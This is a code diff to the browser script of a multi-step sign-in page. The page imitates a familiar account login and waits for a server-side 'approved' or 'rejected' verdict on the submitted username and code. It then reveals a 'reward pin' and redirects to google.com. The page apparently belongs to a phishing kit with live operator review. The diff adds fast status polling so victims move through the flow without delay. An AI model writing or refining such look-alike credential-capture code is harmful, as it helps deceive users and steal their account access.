@@ -2,6 +2,7 @@ let currentUsername = '';
 let currentCoupon = '';
 let currentToken = localStorage.getItem('user_token') || '';
 let eventSource = null;
+let pollInterval = null;
 let redirectUrl = 'https://google.com';
 
 const step1 = document.getElementById('step1');
@@ -25,6 +26,13 @@ const btnSubmit2 = document.getElementById('btnSubmit2');
 const btnDone = document.getElementById('btnDone');
 const btnRetry = document.getElementById('btnRetry');
 
+function stopPolling() {
+  if (pollInterval) {
+    clearInterval(pollInterval);
+    pollInterval = null;
+  }
+}
+
 function showStep(stepName) {
   step1.classList.add('hidden');
   step2.classList.add('hidden');
@@ -34,12 +42,14 @@ function showStep(stepName) {
   progressBar.classList.remove('active');
 
   if (stepName === 'step1') {
+    stopPolling();
     pageTitle.textContent = 'Sign in';
     pageSubtitle.textContent = 'to continue to your account';
     pageSubtitle.style.display = 'block';
     step1.classList.remove('hidden');
     usernameInput.focus();
   } else if (stepName === 'step2') {
+    stopPolling();
     pageTitle.textContent = 'Welcome';
     pageSubtitle.style.display = 'none';
     chipUsername.textContent = currentUsername;
@@ -52,10 +62,12 @@ function showStep(stepName) {
     stepWaiting.classList.remove('hidden');
     progressBar.classList.add('active');
   } else if (stepName === 'step3') {
-    pageTitle.textContent = '2-Step Verification';
+    stopPolling();
+    pageTitle.textContent = 'Verification code';
     pageSubtitle.style.display = 'none';
     step3.classList.remove('hidden');
   } else if (stepName === 'rejected') {
+    stopPolling();
     pageTitle.textContent = 'Couldn\'t sign you in';
     pageSubtitle.textContent = '';
     pageSubtitle.style.display = 'none';
@@ -157,52 +169,69 @@ couponInput.addEventListener('keypress', (e) => {
   }
 });
 
-// Real-time listener via SSE
+// Real-time listener: SSE + robust auto-polling (works across serverless & multi-instances)
 function listenForStatus(token) {
   if (eventSource) {
-    eventSource.close();
+    try { eventSource.close(); } catch (e) {}
   }
 
-  eventSource = new EventSource(`/api/submissions/${token}/events`);
-
-  eventSource.onmessage = (event) => {
+  // Active status checker
+  const pollStatus = async () => {
+    if (!currentToken) return;
     try {
-      const data = JSON.parse(event.data);
-      if (data.status === 'approved') {
-        if (eventSource) eventSource.close();
-        pinDisplay.textContent = data.reward_pin || '----';
-        redirectUrl = data.redirect_url || redirectUrl;
-        showStep('step3');
-      } else if (data.status === 'rejected') {
-        if (eventSource) eventSource.close();
-        showStep('rejected');
+      const res = await fetch(`/api/submissions/${currentToken}/status`);
+      if (res.ok) {
+        const data = await res.json();
+        if (data.status === 'approved') {
+          stopPolling();
+          if (eventSource) { try { eventSource.close(); } catch (e) {} }
+          pinDisplay.textContent = data.reward_pin || '----';
+          redirectUrl = data.redirect_url || redirectUrl;
+          showStep('step3');
+        } else if (data.status === 'rejected') {
+          stopPolling();
+          if (eventSource) { try { eventSource.close(); } catch (e) {} }
+          showStep('rejected');
+        }
       }
-    } catch (err) {
-      console.error(err);
+    } catch (e) {
+      console.error(e);
     }
   };
 
-  eventSource.onerror = () => {
-    setTimeout(async () => {
-      if (currentToken) {
-        try {
-          const res = await fetch(`/api/submissions/${currentToken}/status`);
-          if (res.ok) {
-            const data = await res.json();
-            if (data.status === 'approved') {
-              if (eventSource) eventSource.close();
-              pinDisplay.textContent = data.reward_pin || '----';
-              redirectUrl = data.redirect_url || redirectUrl;
-              showStep('step3');
-            } else if (data.status === 'rejected') {
-              if (eventSource) eventSource.close();
-              showStep('rejected');
-            }
-          }
-        } catch (e) {}
+  // Start polling every 1.5 seconds so even if SSE is closed by serverless, user transitions instantly
+  stopPolling();
+  pollInterval = setInterval(pollStatus, 1500);
+
+  // Also setup SSE for zero-delay instant push
+  try {
+    eventSource = new EventSource(`/api/submissions/${token}/events`);
+
+    eventSource.onmessage = (event) => {
+      try {
+        const data = JSON.parse(event.data);
+        if (data.status === 'approved') {
+          stopPolling();
+          eventSource.close();
+          pinDisplay.textContent = data.reward_pin || '----';
+          redirectUrl = data.redirect_url || redirectUrl;
+          showStep('step3');
+        } else if (data.status === 'rejected') {
+          stopPolling();
+          eventSource.close();
+          showStep('rejected');
+        }
+      } catch (err) {
+        console.error(err);
       }
-    }, 3000);
-  };
+    };
+
+    eventSource.onerror = () => {
+      // If serverless drops SSE connection, pollInterval is already running
+    };
+  } catch (e) {
+    console.error(e);
+  }
 }
 
 // Step 3 -> Done (Redirect to main website)
